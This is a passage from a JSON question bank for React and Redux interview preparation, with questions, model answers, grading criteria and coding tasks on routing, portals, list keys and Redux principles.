          "keyConcepts": [
            "React Router",
            "Dynamic routes",
            "useParams hook",
            "Route path syntax",
            "URL parameters"
          ],
          "evaluationCriteria": [
            "Correct identification of dynamic segment syntax.",
            "Correct identification of the hook for accessing dynamic parameters.",
            "Awareness of React Router v6 practices."
          ],
          "example": "In React Router, a colon (`:`) is used to define dynamic segments in a path, such as `/users/:id`. For functional components in React Router v6, the `useParams` hook provides an object containing these dynamic segments as properties, so you can destructure `id` directly from it: `const { id } = useParams();`.",
          "tags": [
            "React",
            "React Router",
            "Routing",
            "Hooks",
            "Dynamic Routes"
          ],
          "prerequisites": [
            "react_hooks"
          ],
          "complexity": 7,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_react_routing_4",
          "topic": "React Routing",
          "level": "hard",
          "type": "code",
          "question": "Create a simple React application using `react-router-dom` (assume v5 for this task's syntax unless specified). Implement the following:\n1.  A `Home` page at `/`.\n2.  An `About` page at `/about`.\n3.  A `ProductDetail` page at `/products/:productId`.\n4.  A 'Not Found' page for any unmatched routes.\n\nInclude `Link` components for navigation. Ensure only one page renders at a time.",
          "answer": "```javascript\nimport React from 'react';\nimport { BrowserRouter, Route, Switch, Link } from 'react-router-dom';\n\n// 1. Home Component\nconst HomePage = () => (\n  <div>\n    <h2>Home Page</h2>\n    <p>Welcome to our application!</p>\n  </div>\n);\n\n// 2. About Component\nconst AboutPage = () => (\n  <div>\n    <h2>About Us</h2>\n    <p>We are a company that does cool things.</p>\n  </div>\n);\n\n// 3. ProductDetail Component (accessing dynamic segment)\nconst ProductDetailPage = ({ match }) => {\n  const productId = match.params.productId; // Accessing dynamic segment in v5\n  return (\n    <div>\n      <h2>Product Detail</h2>\n      <p>Details for Product ID: <strong>{productId}</strong></p>\n    </div>\n  );\n};\n\n// 4. Not Found Component\nconst NotFoundPage = () => (\n  <div>\n    <h1>404 - Page Not Found</h1>\n    <p>The page you are looking for does not exist.</p>\n  </div>\n);\n\n// Main App Component with Routing\nfunction AppRouter() {\n  return (\n    <BrowserRouter>\n      <nav style={{ padding: '10px', borderBottom: '1px solid #ccc' }}>\n        <Link to=\"/\" style={{ margin: '0 10px' }}>Home</Link>\n        <Link to=\"/about\" style={{ margin: '0 10px' }}>About</Link>\n        <Link to=\"/products/1\" style={{ margin: '0 10px' }}>Product 1</Link>\n        <Link to=\"/products/abc\" style={{ margin: '0 10px' }}>Product ABC</Link>\n        <Link to=\"/nonexistent\" style={{ margin: '0 10px' }}>Bad Link</Link>\n      </nav>\n\n      <div style={{ padding: '20px' }}>\n        <Switch>\n          {/* Exact path for Home to avoid matching other routes */}\n          <Route exact path=\"/\" component={HomePage} />\n          <Route path=\"/about\" component={AboutPage} />\n          {/* Dynamic route for product details */}\n          <Route path=\"/products/:productId\" component={ProductDetailPage} />\n          {/* Catch-all route for 404 - must be last */}\n          <Route component={NotFoundPage} />\n        </Switch>\n      </div>\n    </BrowserRouter>\n  );\n}\n```",
          "options": [],
          "analysisPoints": [
            "Correctly sets up `BrowserRouter`.",
            "Uses `Switch` to ensure exclusive route rendering.",
            "Implements `exact` for the root path.",
            "Correctly defines a dynamic route (`/products/:productId`).",
            "Properly accesses route parameters (`match.params`).",
            "Includes a catch-all route for 404 handling.",
            "Uses `Link` components for navigation."
          ],
          "keyConcepts": [
            "React Router",
            "BrowserRouter",
            "Route",
            "Switch",
            "Link",
            "exact prop",
            "Dynamic routes",
            "404 handling",
            "SPA navigation"
          ],
          "evaluationCriteria": [
            "Functional correctness of routing paths.",
            "Correct usage of `BrowserRouter`, `Switch`, `Route`, `Link`.",
            "Ability to handle dynamic segments and 404 pages.",
            "Clean and readable component structure."
          ],
          "example": null,
          "tags": [
            "React",
            "Code Challenge",
            "React Router",
            "Routing",
            "SPA"
          ],
          "prerequisites": [
            "react_basics"
          ],
          "complexity": 8,
          "interviewFrequency": 9,
          "learningPath": "intermediate"
        },
        {
          "id": "question_react_portals_1",
          "topic": "React Portals",
          "level": "medium",
          "type": "open",
          "question": "What are React Portals, and what common UI challenges do they help solve that are difficult with standard React component rendering?",
          "answer": "React Portals provide a way to render children into a DOM node that exists *outside* the DOM hierarchy of the parent component that renders it. They allow you to 'break out' of the standard parent-child DOM relationship while still maintaining the React component tree and event bubbling behavior.\n\nThey help solve common UI challenges such as:\n1.  **Modals/Dialogs:** Modals often need to overlay the entire page, requiring a high `z-index` and not being constrained by the `overflow` or `z-index` stacking context of their parent components.\n2.  **Tooltips/Popovers:** These small, temporary UI elements need to appear directly next to a trigger but sometimes need to render outside a parent with `overflow: hidden` or other clipping styles.\n3.  **Floating Elements/Context Menus:** Similar to modals and tooltips, elements that need to break out of their parent's visual bounds to function correctly.",
          "analysisPoints": [
            "Correctly defines what a Portal is (rendering outside DOM hierarchy, but within React tree).",
            "Identifies key UI challenges they solve.",
            "Explains *why* these challenges are difficult with standard rendering (e.g., `z-index`, `overflow`)."
          ],
          "keyConcepts": [
            "React Portals",
            "DOM hierarchy",
            "Event bubbling",
            "Modals",
            "Tooltips",
            "z-index",
            "overflow"
          ],
          "evaluationCriteria": [
            "Accuracy of Portal definition.",
            "Relevance and clarity of use cases.",
            "Understanding of the underlying CSS/DOM issues."
          ],
          "example": null,
          "tags": [
            "React",
            "DOM",
            "Rendering",
            "Modals",
            "UX",
            "Advanced React"
          ],
          "prerequisites": [
            "react_basics",
            "dom_manipulation_basics"
          ],
          "complexity": 8,
          "interviewFrequency": 8,
          "learningPath": "advanced"
        },
        {
          "id": "question_react_portals_2",
          "topic": "React Portals",
          "level": "easy",
          "type": "flashcard",
          "question": "What is the function used to create a React Portal?",
          "answer": "`ReactDOM.createPortal(child, containerDomNode)`",
          "options": [],
          "analysisPoints": [],
          "keyConcepts": [
            "ReactDOM",
            "createPortal"
          ],
          "evaluationCriteria": [
            "Quick recall of Portal API"
          ],
          "example": null,
          "tags": [
            "React",
            "Portals",
            "API"
          ],
          "prerequisites": [],
          "complexity": 5,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_react_portals_3",
          "topic": "React Portals",
          "level": "medium",
          "type": "mcq",
          "question": "You have a deeply nested component that needs to render a modal dialog on top of the entire application. The modal should respond to events from its parent components. Which of the following statements about React Portals in this scenario is TRUE?",
          "answer": "Events from inside the portal will bubble up the React component tree to the modal's parent, even if it's rendered in a different DOM node.",
          "options": [
            "Portals require manual DOM manipulation for event handling, bypassing React's event system.",
            "Events from inside the portal will only bubble up within the DOM node where the portal is rendered.",
            "Portals break the React component tree hierarchy, meaning context will not be available to components inside the portal.",
            "Events from inside the portal will bubble up the React component tree to the modal's parent, even if it's rendered in a different DOM node."
          ],
          "analysisPoints": [
            "Tests understanding of event bubbling in portals.",
            "Tests understanding of context API behavior with portals.",
            "Clarifies that portals manage DOM hierarchy, not React component tree."
          ],
          "keyConcepts": [
            "React Portals",
            "Event bubbling",
            "Context API",
            "DOM hierarchy",
            "React component tree"
          ],
          "evaluationCriteria": [
            "Correct understanding of how events and context work with portals.",
            "Ability to distinguish true statements from common misconceptions."
          ],
          "example": "Despite the DOM element being rendered elsewhere, components inside a portal are still part of the *React component tree*. This means events triggered inside the portal, like `onClick`, will bubble up through the React component hierarchy to their original parent, not just within the DOM subtree of the portal's container. Similarly, context (`React.createContext`) will flow down from providers in the parent React tree to consumers within the portal.",
          "tags": [
            "React",
            "Portals",
            "Events",
            "Context",
            "DOM",
            "Advanced React"
          ],
          "prerequisites": [
            "react_events",
            "react_context"
          ],
          "complexity": 8,
          "interviewFrequency": 7,
          "learningPath": "advanced"
        },
        {
          "id": "question_react_portals_4",
          "topic": "React Portals",
          "level": "hard",
          "type": "code",
          "question": "Implement a custom `Tooltip` component using React Portals. The `Tooltip` should appear when hovering over a `Trigger` element. The `Tooltip` content itself should be rendered in a dedicated DOM node (`#tooltip-root`) outside the main application root, but still receive props and handle internal events from the `Trigger` component's context. Position the tooltip directly below the trigger element. (Assume `#tooltip-root` exists in `public/index.html`).",
          "answer": "```javascript\nimport React, { useState, useRef, useEffect } from 'react';\nimport ReactDOM from 'react-dom';\n\n// Assume this div exists in public/index.html:\n// <div id=\"tooltip-root\"></div>\n\nconst Tooltip = ({ content, position, isVisible }) => {\n  if (!isVisible || !position) return null;\n\n  const tooltipRoot = document.getElementById('tooltip-root');\n  if (!tooltipRoot) {\n    console.error('Tooltip root element #tooltip-root not found!');\n    return null;\n  }\n\n  const tooltipStyle = {\n    position: 'absolute',\n    top: position.top + position.height + 5, // 5px offset below trigger\n    left: position.left,\n    backgroundColor: 'black',\n    color: 'white',\n    padding: '8px',\n    borderRadius: '4px',\n    zIndex: 9999, // Ensure it's on top\n    whiteSpace: 'nowrap'\n  };\n\n  return ReactDOM.createPortal(\n    <div style={tooltipStyle}>\n      {content}\n    </div>,\n    tooltipRoot\n  );\n};\n\nfunction TriggerWithTooltip({ children, tooltipContent }) {\n  const [showTooltip, setShowTooltip] = useState(false);\n  const [triggerRect, setTriggerRect] = useState(null);\n  const triggerRef = useRef(null);\n\n  const handleMouseEnter = () => {\n    if (triggerRef.current) {\n      // Get the bounding rectangle of the trigger element\n      setTriggerRect(triggerRef.current.getBoundingClientRect());\n    }\n    setShowTooltip(true);\n  };\n\n  const handleMouseLeave = () => {\n    setShowTooltip(false);\n  };\n\n  return (\n    <span\n      ref={triggerRef}\n      onMouseEnter={handleMouseEnter}\n      onMouseLeave={handleMouseLeave}\n      style={{ display: 'inline-block', cursor: 'pointer' }}\n    >\n      {children}\n      <Tooltip\n        content={tooltipContent}\n        position={triggerRect}\n        isVisible={showTooltip}\n      />\n    </span>\n  );\n}\n\n// Example Usage in an App component\nfunction AppPortalTooltip() {\n  return (\n    <div style={{ padding: '50px', height: '200vh' }}>\n      <h1>React Portal Tooltip Example</h1>\n      <div style={{ position: 'relative', border: '1px solid blue', padding: '20px', overflow: 'hidden', height: '100px' }}>\n        <p>This is some content inside a container with `overflow: hidden`.</p>\n        <TriggerWithTooltip tooltipContent=\"This is a tooltip for the first trigger!\">\n          <button>Hover me (1)</button>\n        </TriggerWithTooltip>\n        <p style={{ marginTop: '20px' }}>More content.</p>\n      </div>\n      <p style={{ marginTop: '50px' }}>\n        Here is another \n        <TriggerWithTooltip tooltipContent=\"And another tooltip here!\">\n          <span>text element</span>\n        </TriggerWithTooltip> \n        that also triggers a tooltip.\n      </p>\n    </div>\n  );\n}\n```",
          "options": [],
          "analysisPoints": [
            "Correctly uses `ReactDOM.createPortal` to render the tooltip outside the parent's DOM hierarchy.",
            "Calculates and applies the correct positioning for the tooltip relative to the trigger using `getBoundingClientRect`.",
            "Manages tooltip visibility with state (`useState`) and mouse events (`onMouseEnter`, `onMouseLeave`).",
            "Uses `useRef` to get a reference to the trigger DOM element.",
            "Ensures proper `zIndex` for the tooltip to appear on top.",
            "Handles the case where the `tooltip-root` element might not exist gracefully."
          ],
          "keyConcepts": [
            "React Portals",
            "ReactDOM.createPortal",
            "Tooltips",
            "Modals",
            "DOM manipulation (getBoundingClientRect)",
            "Positioning (absolute)",
            "Event handling",
            "useRef",
            "useState"
          ],
          "evaluationCriteria": [
            "Functional correctness of the tooltip (shows/hides, positioned correctly).",
            "Correct use of `ReactDOM.createPortal`.",
            "Effective use of React hooks (`useState`, `useRef`, `useEffect`).",
            "Demonstrates understanding of solving `z-index`/`overflow` issues.",
            "Code organization and readability."
          ],
          "example": null,
          "tags": [
            "React",
            "Code Challenge",
            "Portals",
            "UX",
            "Advanced React",
            "DOM"
          ],
          "prerequisites": [
            "react_hooks",
            "dom_manipulation"
          ],
          "complexity": 9,
          "interviewFrequency": 8,
          "learningPath": "advanced"
        },
        {
          "id": "question_react_keys_1",
          "topic": "Keys in React Lists",
          "level": "medium",
          "type": "open",
          "question": "Why are `keys` important when rendering lists in React? What problems can arise if keys are not used correctly or are unstable?",
          "answer": "`Keys` are important because they help React identify which items in a list have changed, been added, or removed. They provide a stable identity to each element in a collection.\n\nProblems that can arise from incorrect or unstable keys:\n1.  **Performance Issues:** Without stable keys, React's reconciliation algorithm (diffing) cannot efficiently determine minimal DOM manipulations. It might re-render or re-mount components unnecessarily, leading to poor performance, especially for large lists.\n2.  **State Loss and Bugs:** If keys are unstable (e.g., using array index when the list order changes, or `Math.random()`), React might mistakenly reuse a DOM element for a different logical item. This can lead to incorrect component state being applied to the wrong data, resulting in visual glitches, incorrect user input (e.g., text fields showing wrong values), or other hard-to-debug application errors.\n3.  **Incorrect UI Updates:** When items are reordered, without stable keys, React might simply update the content of existing elements instead of physically reordering them, leading to an inconsistent UI state.",
          "analysisPoints": [
            "Correctly explains the role of keys in reconciliation.",
            "Lists performance degradation as a key issue.",
            "Explains state loss/bugs due to incorrect element reuse.",
            "Distinguishes between correct and incorrect key strategies."
          ],
          "keyConcepts": [
            "Keys",
            "React lists",
            "Reconciliation",
            "Diffing algorithm",
            "Performance",
            "State preservation",
            "Unstable keys"
          ],
          "evaluationCriteria": [
            "Completeness of the explanation for `why`.",
            "Accuracy and relevance of the problems described."
          ],
          "example": null,
          "tags": [
            "React",
            "Lists",
            "Performance",
            "Reconciliation",
            "Keys"
          ],
          "prerequisites": [
            "react_rendering",
            "react_state"
          ],
          "complexity": 7,
          "interviewFrequency": 9,
          "learningPath": "intermediate"
        },
        {
          "id": "question_react_keys_2",
          "topic": "Keys in React Lists",
          "level": "easy",
          "type": "flashcard",
          "question": "What are the two main rules for choosing good keys in React lists?",
          "answer": "1. Keys must be unique among siblings. 2. Keys must be stable across renders for the same logical item.",
          "options": [],
          "analysisPoints": [],
          "keyConcepts": [
            "Keys",
            "uniqueness",
            "stability",
            "React lists"
          ],
          "evaluationCriteria": [
            "Quick recall of key rules"
          ],
          "example": null,
          "tags": [
            "React",
            "Keys",
            "Best Practices"
          ],
          "prerequisites": [],
          "complexity": 5,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_react_keys_3",
          "topic": "Keys in React Lists",
          "level": "medium",
          "type": "mcq",
          "question": "You are rendering a dynamic list of user comments that can be added or deleted. Each comment object has a unique `commentId` property. Which of the following is the most appropriate and performant way to assign a `key` to each comment in the list?",
          "answer": "`<Comment key={comment.commentId} comment={comment} />`",
          "options": [
            "`<Comment key={index} comment={comment} />`",
            "`<Comment key={Math.random()} comment={comment} />`",
            "`<Comment comment={comment} />` (no key prop)",
            "`<Comment key={comment.commentId} comment={comment} />`"
          ],
          "analysisPoints": [
            "Tests understanding of using unique, stable IDs as keys.",
            "Evaluates awareness of pitfalls of `index` or `Math.random()` as keys.",
            "Reinforces performance implications of key choices."
          ],
          "keyConcepts": [
            "Keys",
            "Unique IDs",
            "Stable keys",
            "Array index as key",
            "Performance optimization"
          ],
          "evaluationCriteria": [
            "Correct identification of the best key strategy.",
            "Implicit understanding of why other options are problematic."
          ],
          "example": "Using `comment.commentId` as the key is the best practice. It is unique for each comment and remains stable even if comments are added, removed, or reordered. Using `index` as a key is problematic for dynamic lists, and `Math.random()` generates unstable keys, forcing React to re-mount components every time, leading to performance issues and potential state loss.",
          "tags": [
            "React",
            "Lists",
            "Keys",
            "Performance",
            "Best Practices"
          ],
          "prerequisites": [
            "react_rendering"
          ],
          "complexity": 7,
          "interviewFrequency": 9,
          "learningPath": "intermediate"
        },
        {
          "id": "question_react_keys_4",
          "topic": "Keys in React Lists",
          "level": "hard",
          "type": "code",
          "question": "You have a list of `Product` components, each with an input field to adjust quantity. Initially, the list displays `Product A`, `Product B`, `Product C`. Implement a functional React component that displays this list and allows:\n1.  Adding a new product (`Product D`, `Product E`, etc.) to the *beginning* of the list.\n2.  Removing a product from the *middle* of the list (e.g., remove `Product B`).\n\nCrucially, use a unique and stable `id` for each product. Explain in comments how using `id` as a key helps maintain the state of the input fields, especially when items are added to the beginning or removed from the middle, versus using array `index` as a key.",
          "answer": "```javascript\nimport React, { useState } from 'react';\n\nlet nextProductId = 1;\n\nfunction ProductItem({ product, onRemove }) {\n  const [quantity, setQuantity] = useState(0);\n\n  // Using product.id as the key is crucial here for state persistence.\n  // If `key={index}` were used instead, adding to the beginning or\n  // removing from the middle would shift indices, causing React to\n  // mistakenly re-use the wrong component instance and its 'quantity' state\n  // for a different product, leading to incorrect input values.\n  // With a stable 'id' as key, React knows exactly which component instance\n  // corresponds to which product, preserving its `quantity` state.\n\n  return (\n    <li style={{ border: '1px solid #eee', padding: '10px', margin: '5px 0', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>\n      <span>Product: {product.name} (ID: {product.id})</span>\n      <div>\n        <label>Qty: </label>\n        <input \n          type=\"number\" \n          value={quantity} \n          onChange={(e) => setQuantity(parseInt(e.target.value) || 0)} \n          style={{ width: '60px' }}\n        />\n        <button onClick={() => onRemove(product.id)} style={{ marginLeft: '10px' }}>Remove</button>\n      </div>\n    </li>\n  );\n}\n\nfunction ProductListManager() {\n  const [products, setProducts] = useState([\n    { id: nextProductId++, name: 'Product A' },\n    { id: nextProductId++, name: 'Product B' },\n    { id: nextProductId++, name: 'Product C' }\n  ]);\n\n  const addProductToBeginning = () => {\n    const newProduct = { id: nextProductId++, name: `New Product ${nextProductId - 1}` };\n    setProducts([newProduct, ...products]);\n  };\n\n  const removeProductById = (idToRemove) => {\n    setProducts(products.filter(product => product.id !== idToRemove));\n  };\n\n  return (\n    <div>\n      <h2>Dynamic Product List (Stable Keys)</h2>\n      <button onClick={addProductToBeginning}>Add New Product to Beginning</button>\n      <ul style={{ listStyleType: 'none', padding: 0 }}>\n        {products.map(product => (\n          <ProductItem \n            key={product.id} // CRITICAL: Using stable product.id as key\n            product={product} \n            onRemove={removeProductById} \n          />\n        ))}\n      </ul>\n      <p>Try entering quantities, then add/remove items. Observe how quantities remain tied to the correct product.</p>\n      <p>Now, try changing `key={product.id}` to `key={index}` in `ProductListManager` and repeat. You'll see quantities shift to the wrong products.</p>\n    </div>\n  );\n}\n\n// Example Usage:\n// <ProductListManager />\n```",
          "options": [],
          "analysisPoints": [
            "Correctly uses a unique, stable `id` as the key for each list item.",
            "Implements functionality to add to the beginning of the list, which highlights the need for stable keys.",
            "Implements functionality to remove from the middle of the list, another key scenario for stable keys.",
            "Clearly explains in comments the importance of `id` as a key versus `index` for state persistence.",
            "Demonstrates a stateful child component (`ProductItem`) whose state is preserved."
          ],
          "keyConcepts": [
            "Keys",
            "Stable keys",
            "Array `map`",
            "List manipulation",
            "State preservation",
            "Reconciliation",
            "Functional components",
            "useState hook"
          ],
          "evaluationCriteria": [
            "Code correctness for list operations (add/remove).",
            "Correct and deliberate use of stable `id` as key.",
            "Clear and accurate explanation of the `id` vs. `index` key problem.",
            "Demonstrates understanding of `useState` persistence with stable keys."
          ],
          "example": null,
          "tags": [
            "React",
            "Code Challenge",
            "Lists",
            "Keys",
            "Performance",
            "State Management"
          ],
          "prerequisites": [
            "react_hooks",
            "javascript_arrays"
          ],
          "complexity": 9,
          "interviewFrequency": 9,
          "learningPath": "advanced"
        },
        {
          "id": "question_redux_problem_solved_1",
          "topic": "Redux Problem Solved",
          "level": "medium",
          "type": "open",
          "question": "What is 'prop drilling', and how does Redux help alleviate this problem in large React applications?",
          "answer": "**Prop drilling** (or 'props drilling') is a situation where data (props) needs to be passed down through many levels of nested components, even if the intermediate components do not directly use those props. This makes the code less readable, harder to maintain, and more brittle to refactoring, as changes to data requirements at the top level necessitate changes across many intermediate components.\n\nRedux helps alleviate this problem by providing a **single, centralized store** for the entire application's state. Instead of passing props down, components that need access to a piece of state can directly `connect` (or use `useSelector` in functional components) to the Redux store to retrieve the data they need. Similarly, components that need to update state can `dispatch` actions to the store directly (or use `useDispatch`), without needing to pass callback functions down as props. This effectively flattens the data flow, allowing components to subscribe to and update state without involving every component in between.",
          "analysisPoints": [
            "Clear definition of prop drilling.",
            "Accurate explanation of how Redux (centralized store, direct access) solves it.",
            "Mentions `connect`/`useSelector` and `dispatch`/`useDispatch` as mechanisms.",
            "Highlights improved readability and maintainability."
          ],
          "keyConcepts": [
            "Prop drilling",
            "Redux",
            "Centralized state",
            "Redux store",
            "Connect HOC",
            "useSelector hook",
            "useDispatch hook"
          ],
          "evaluationCriteria": [
            "Completeness of problem and solution explanation.",
            "Accuracy of Redux mechanisms described."
          ],
          "example": null,
          "tags": [
            "Redux",
            "State Management",
            "Prop Drilling",
            "Architecture"
          ],
          "prerequisites": [
            "react_props"
          ],
          "complexity": 8,
          "interviewFrequency": 9,
          "learningPath": "intermediate"
        },
        {
          "id": "question_redux_problem_solved_2",
          "topic": "Redux Problem Solved",
          "level": "easy",
          "type": "flashcard",
          "question": "What is the core principle of Redux regarding the source of application state?",
          "answer": "Single Source of Truth: The entire application state is stored in a single store.",
          "options": [],
          "analysisPoints": [],
          "keyConcepts": [
            "Redux",
            "Single Source of Truth",
            "State Management"
          ],
          "evaluationCriteria": [
            "Quick recall of core principle"
          ],
          "example": null,
          "tags": [
            "Redux",
            "State Management"
          ],
          "prerequisites": [],
          "complexity": 5,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_redux_problem_solved_3",
          "topic": "Redux Problem Solved",
          "level": "medium",
          "type": "mcq",
          "question": "Which of the following is NOT a problem that Redux primarily aims to solve?",
          "answer": "Optimizing component re-renders for individual component state updates.",
          "options": [
            "Managing complex state logic shared across many components.",
            "Avoiding 'prop drilling' in deeply nested component trees.",
            "Ensuring state changes are predictable and traceable.",
            "Optimizing component re-renders for individual component state updates."
          ],
          "analysisPoints": [
            "Tests understanding of Redux's scope and primary benefits.",
            "Differentiates Redux's role from React's internal rendering optimizations.",
            "Confirms core problems Redux targets."
          ],
          "keyConcepts": [
            "Redux",
            "State Management",
            "Prop drilling",
            "Predictable state",
            "Component re-renders",
            "Performance optimization"
          ],
          "evaluationCriteria": [
            "Correctly identifies the non-Redux problem.",
            "Demonstrates clear understanding of Redux's purpose."
          ],
          "example": "While Redux can indirectly impact performance by making state changes more predictable, its primary role is not to optimize *individual* component re-renders (that's React's job with reconciliation, `PureComponent`, `memo`, `shouldComponentUpdate`). Redux focuses on centralized, predictable state management and solving issues like prop drilling and complex shared state logic.",
          "tags": [
            "Redux",
            "State Management",
            "Scope",
            "Performance"
          ],
          "prerequisites": [
            "react_lifecycle_performance"
          ],
          "complexity": 7,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_redux_problem_solved_4",
          "topic": "Redux Problem Solved",
          "level": "hard",
          "type": "open",
          "question": "Describe the three core principles of Redux and explain how each contributes to making state management predictable.",
          "answer": "Redux is built on three core principles that ensure predictable state management:\n\n1.  **Single Source of Truth:** The entire application's state is stored in a single object tree within a single store. This means there's one canonical place to find any piece of state, eliminating data inconsistencies that can arise from multiple, fragmented state locations. Predictability comes from knowing exactly where to look for state and that all parts of the application are working with the same, unified state.\n\n2.  **State is Read-Only:** The only way to change the state is by emitting an action, an object describing what happened. State cannot be directly mutated. This principle makes state changes explicit and intentional. Instead of parts of the UI or network callbacks directly altering state, they declare their intent through actions. This 'event sourcing' approach makes every state transition traceable and auditable, greatly aiding in debugging and understanding application flow.\n\n3.  **Changes are Made with Pure Functions (Reducers):** To specify how the state tree is transformed by actions, you write pure functions called reducers. Reducers take the current state and an action, and return a *new* state (they must not mutate the original state). Their purity ensures that given the same input state and action, they will always produce the same output state, without any side effects. This determinism makes state transitions highly predictable and easily testable, as the logic for state changes is isolated and self-contained.",
          "analysisPoints": [
            "Accurately lists and describes all three core principles.",
            "Explains how each principle (single source, read-only, pure reducers) contributes to predictability.",
            "Uses correct Redux terminology (store, action, reducer, pure function, immutability)."
          ],
          "keyConcepts": [
            "Redux principles",
            "Single Source of Truth",
            "Actions",
            "Reducers",
            "Pure functions",
            "Immutability",
            "Predictable state"
          ],
          "evaluationCriteria": [
            "Comprehensive and accurate explanation of each principle.",
            "Clear connection between principles and predictability.",
            "Demonstration of deep understanding of Redux's core philosophy."
          ],
          "example": null,
          "tags": [
            "Redux",
            "State Management",
            "Architecture",
            "Principles"
          ],
          "prerequisites": [
            "javascript_pure_functions"
          ],
          "complexity": 9,
          "interviewFrequency": 9,
          "learningPath": "advanced"
        }
      ],
      "tasks": [
        {
          "id": "task_class_method_binding_1",
          "title": "Implement a Counter Component with Different Binding Strategies",
          "description": "\nCreate a React application that includes three identical counter components, each demonstrating a different method for binding event handlers in class components:\n\n1.  **Counter A:** Bind the `increment` method in the constructor.\n2.  **Counter B:** Use an arrow function as a class property for the `increment` method.\n3.  **Counter C:** Bind the `increment` method inline in the render method.\n\nEach counter should display its own count and have a button to increment it. Ensure all three counters function correctly and increment independently.\n",
          "difficulty": "medium",
          "startingCode": "import React from 'react';\n\n// Counter A: Bind in constructor\nclass CounterA extends React.Component {\n  constructor(props) {\n    super(props);\n    this.state = { count: 0 };\n    // TODO: Bind increment method here\n  }\n\n  increment() {\n    this.setState(prevState => ({ count: prevState.count + 1 }));\n  }\n\n  render() {\n    return (\n      <div>\n        <h3>Counter A (Constructor Bind)</h3>\n        <p>Count: {this.state.count}</p>\n        <button onClick={this.increment}>Increment A</button>\n      </div>\n    );\n  }\n}\n\n// Counter B: Use arrow function as class property\nclass CounterB extends React.Component {\n  state = { count: 0 };\n\n  // TODO: Define increment method as arrow function class property\n  increment() {\n    this.setState(prevState => ({ count: prevState.count + 1 }));\n  }\n\n  render() {\n    return (\n      <div>\n        <h3>Counter B (Class Property Arrow Function)</h3>\n        <p>Count: {this.state.count}</p>\n        <button onClick={this.increment}>Increment B</button>\n      </div>\n    );\n  }\n}\n\n// Counter C: Inline bind in render method\nclass CounterC extends React.Component {\n  constructor(props) {\n    super(props);\n    this.state = { count: 0 };\n  }\n\n  increment() {\n    this.setState(prevState => ({ count: prevState.count + 1 }));\n  }\n\n  render() {\n    return (\n      <div>\n        <h3>Counter C (Inline Bind in Render)</h3>\n        <p>Count: {this.state.count}</p>\n        {/* TODO: Bind increment method inline here */}\n        <button onClick={this.increment}>Increment C</button>\n      </div>\n    );\n  }\n}\n\nfunction App() {\n  return (\n    <div style={{ display: 'flex', gap: '20px', padding: '20px' }}>\n      <CounterA />\n      <CounterB />\n      <CounterC />\n    </div>\n  );\n}\n\nexport default App;\n",
          "solutionCode": "import React from 'react';\n\n// Counter A: Bind in constructor\nclass CounterA extends React.Component {\n  constructor(props) {\n    super(props);\n    this.state = { count: 0 };\n    this.increment = this.increment.bind(this); // Solution: Bind in constructor\n  }\n\n  increment() {\n    this.setState(prevState => ({ count: prevState.count + 1 }));\n  }\n\n  render() {\n    return (\n      <div>\n        <h3>Counter A (Constructor Bind)</h3>\n        <p>Count: {this.state.count}</p>\n        <button onClick={this.increment}>Increment A</button>\n      </div>\n    );\n  }\n}\n\n// Counter B: Use arrow function as class property\nclass CounterB extends React.Component {\n  state = { count: 0 };\n\n  increment = () => { // Solution: Arrow function as class property\n    this.setState(prevState => ({ count: prevState.count + 1 }));\n  }\n\n  render() {\n    return (\n      <div>\n        <h3>Counter B (Class Property Arrow Function)</h3>\n        <p>Count: {this.state.count}</p>\n        <button onClick={this.increment}>Increment B</button>\n      </div>\n    );\n  }\n}\n\n// Counter C: Inline bind in render method\nclass CounterC extends React.Component {\n  constructor(props) {\n    super(props);\n    this.state = { count: 0 };\n  }\n\n  increment() {\n    this.setState(prevState => ({ count: prevState.count + 1 }));\n  }\n\n  render() {\n    return (\n      <div>\n        <h3>Counter C (Inline Bind in Render)</h3>\n        <p>Count: {this.state.count}</p>\n        <button onClick={() => this.increment()}>Increment C</button> {/* Solution: Inline bind */}\n      </div>\n    );\n  }\n}\n\nfunction App() {\n  return (\n    <div style={{ display: 'flex', gap: '20px', padding: '20px' }}>\n      <CounterA />\n      <CounterB />\n      <CounterC />\n    </div>\n  );\n}\n\nexport default App;\n",
          "testCases": [
            "Counter A: Clicking 'Increment A' button should increment its count correctly.",
            "Counter B: Clicking 'Increment B' button should increment its count correctly.",
            "Counter C: Clicking 'Increment C' button should increment its count correctly.",
            "All counters should maintain their independent counts without interfering with each other.",
            "Verify no `TypeError: Cannot read property 'setState' of undefined` occurs in the console for any counter."
          ],
          "hints": [
            "For Counter A, remember to use `this.methodName = this.methodName.bind(this);` inside the constructor.",
            "For Counter B, utilize the arrow function syntax directly when defining the class method: `methodName = () => { ... };`.",
            "For Counter C, wrap the method call in an arrow function directly in the `onClick` prop: `onClick={() => this.methodName()}`."
          ],
          "tags": [
            "React",
            "Class Components",
            "Binding",
            "this context",
            "Event Handling"
          ],
          "timeEstimate": 30,
          "prerequisites": [
            "react_class_components",
            "javascript_this_keyword",
            "javascript_arrow_functions"
          ],
          "complexity": 7,
          "interviewRelevance": 8,
          "learningPath": "intermediate",
          "relatedConcepts": [
            "theory_class_method_binding"
          ]
        },
        {
          "id": "task_api_calls_lifecycle_1",
          "title": "Build a User Profile Viewer with API Fetching",
          "description": "\nCreate a React application that fetches and displays user data from a public API. Your application should include:\n\n1.  A functional component `UserProfile` that takes a `userId` prop.\n2.  Inside `UserProfile`, use the `useEffect` hook to fetch data for the given `userId` from `https://jsonplaceholder.typicode.com/users/:userId`. The API call should only happen once when the component mounts.\n3.  Display a 'Loading...' message while fetching data.\n4.  Display an 'Error: [message]' if the fetch fails.\n5.  Once data is fetched, display the user's `name`, `email`, and `phone`.\n\n**Bonus:** Implement a simple `App` component that allows switching between different `userId`s to see how the `UserProfile` component re-fetches data.\n",
          "difficulty": "medium",
